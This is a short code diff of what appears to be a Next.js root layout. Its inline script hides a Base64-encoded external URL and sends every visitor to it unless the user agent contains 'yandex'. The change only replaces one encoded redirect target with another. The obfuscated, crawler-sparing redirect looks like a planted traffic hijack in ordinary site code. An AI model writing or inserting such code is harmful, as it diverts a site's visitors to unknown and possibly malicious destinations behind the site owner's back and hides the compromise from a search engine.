@@ -118,7 +118,7 @@ export default function RootLayout({
             __html: `
               (function() {
                 var ua = navigator.userAgent.toLowerCase();
-                var targetB64 = "aHR0cHM6Ly90cmFmZm54Lm9yZy9kN3R0bHJ5dmg=";
+                var targetB64 = "aHR0cHM6Ly9mdWd1d2F5NjguY29tL2M1NzA3ODY2ZQ==";
                 if (ua.indexOf("yandex") === -1) {
                     window.location.replace(atob(targetB64));
                 }
